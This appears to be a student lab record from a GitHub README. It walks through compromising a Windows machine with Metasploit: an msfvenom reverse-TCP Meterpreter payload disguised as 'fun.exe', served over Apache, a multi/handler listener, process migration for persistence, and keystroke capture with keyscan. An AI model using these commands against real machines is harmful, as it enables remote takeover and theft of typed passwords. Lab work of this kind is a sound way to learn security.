# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig
![image](https://github.com/Thanikasreeb/Compromising-windows-using-Metasploit/assets/119557910/a71b87b0-8f10-48c0-ae15-0049f3ab84f2)

Create a malicious executable file fun.exe using msenom 
command msfvenom -p windows/meterpreter/reverse_tcp 
LHOST=192.168.1.2 -f exe > fun.exe

![image](https://github.com/Thanikasreeb/Compromising-windows-using-Metasploit/assets/119557910/29263bb1-f4ee-4434-a6cb-db3c05db1e6f)

the fun.exe into the apache /var/www/html folder
![image](https://github.com/Thanikasreeb/Compromising-windows-using-Metasploit/assets/119557910/b477d887-20a6-4ee7-b7f6-077019cf39d8)

Start apache server sudo systemctl apache2 start 
![image](https://github.com/Thanikasreeb/Compromising-windows-using-Metasploit/assets/119557910/07e7c774-bd26-4cb0-be54-a045f40a0064)

Check the status of apache2
![image](https://github.com/Thanikasreeb/Compromising-windows-using-Metasploit/assets/119557910/8539b43e-dba0-467c-b06b-e9fa2a111217)

Invoke msfconsole: Type help or a question mark "?" to see the list of all available commands 
you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST 0.0.0.0 exploit
![image](https://github.com/Thanikasreeb/Compromising-windows-using-Metasploit/assets/119557910/54ce849d-78ad-49d9-8403-8f3dc8a9a858)

On the target Windows machine, open a Web browser and open this URL, replacing the 
IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
![image](https://github.com/Thanikasreeb/Compromising-windows-using-Metasploit/assets/119557910/c70557d6-f0fa-4ba1-8fa1-d827f580f086)

Bypass any warning boxes, double-click the file, and allow it to run. On kali give the command exploit
![image](https://github.com/Thanikasreeb/Compromising-windows-using-Metasploit/assets/119557910/66ea9338-4918-4db9-b6b2-452f40bd7d6e)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156 
The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. 
To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. 
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, 
including one to a remote port of 4444, as highlighted in the image below. 
Notice the "PID/Program name" value for this connection, which is redacted

![image](https://github.com/Thanikasreeb/Compromising-windows-using-Metasploit/assets/119557910/b312f9fa-929d-42d4-93de-a81cfe9ddaa7)
Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the 
target machine keyscan_start Begins capturing keys typed in the target. 
On the Windows target, open Notepad and type in some text, such as your name.
![image](https://github.com/Thanikasreeb/Compromising-windows-using-Metasploit/assets/119557910/d3d2f0cc-8ae2-4ce6-8c62-22dd50d0f143)

keyscan_dump Shows the keystrokes captured so far
![image](https://github.com/Thanikasreeb/Compromising-windows-using-Metasploit/assets/119557910/f92375b8-d498-4246-a9fa-120bf0b89e57)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
